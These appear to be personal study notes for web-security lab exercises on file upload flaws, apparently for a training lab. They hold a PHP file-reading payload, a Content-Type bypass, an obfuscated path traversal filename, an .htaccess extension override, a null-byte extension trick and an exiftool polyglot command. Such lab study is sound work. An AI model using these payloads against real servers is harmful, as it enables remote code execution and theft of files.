## basic 

- upload avatar image -> enable image under *filter by MIME type* in burp 
	-  image was fetched using  `GET` request to `/files/avatars/<YOUR-IMAGE>`
- exploit.php:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
=> `GET /files/avatars/exploit.php HTTP/1.1`
# Exploiting flawed validation 

## Flawed file type validation

- -> response indicates you are only allowed with `image/jpeg` or `image/png` 
- find the post request to `/my-account/avatar` 
- change the `Content-Type` to `image/jpeg`
## Preventing file execution in user-accessible directories

- change the `filename` to include a [[unprocessed-obsidians/OLD/WEB/vulnerabilities/Path Traversal/concepts|directory traversal]] sequence:
    - `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
    	- response: `The file avatars/exploit.php has been uploaded.` -> failed
    - Obfuscate the sequence -> `filename="..%2fexploit.php"`
    	- response: `The file avatars/../exploit.php has been uploaded.` -> success
- `GET /files/avatars/..%2fexploit.php` or `GET /files/exploit.php`
## Insufficient blacklisting

### Overriding the server configuration

apache: 
`LoadModule php_module /usr/lib/apache2/modules/libphp.so AddType application/x-httpd-php .php`

IIS:
`<staticContent> <mimeMap fileExtension=".json" mimeType="application/json" /> </staticContent>`
##### senario
-  in `POST /my-account/avatar` 
	- value of  `filename` ->  `.htaccess`
	- `Content-Type` header -> `text/plain`
	- content of the file -> `AddType application/x-httpd-php .l33t` =>  maps .l33t extension to PHP MIME.
- again in  in `POST /my-account/avatar
	- `filename` -> from `exploit.php` to `exploit.l33`
- `GET /files/avatars/exploit.l33t`
### Obfuscating file extensions

-  in `POST /my-account/avatar` 
	-  `filename="exploit.php%00.jpg"`
		- `exploit.php` in http response -> null byte stripped
- `GET /files/avatars/exploit.php`
## Flawed validation of the file's contents

```shell
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```
- adds the PHP payload to the image's `Comment`
- saves the image with a `.php` extension
- `GET /files/avatars/polyglot.php` => `START [secret text] END`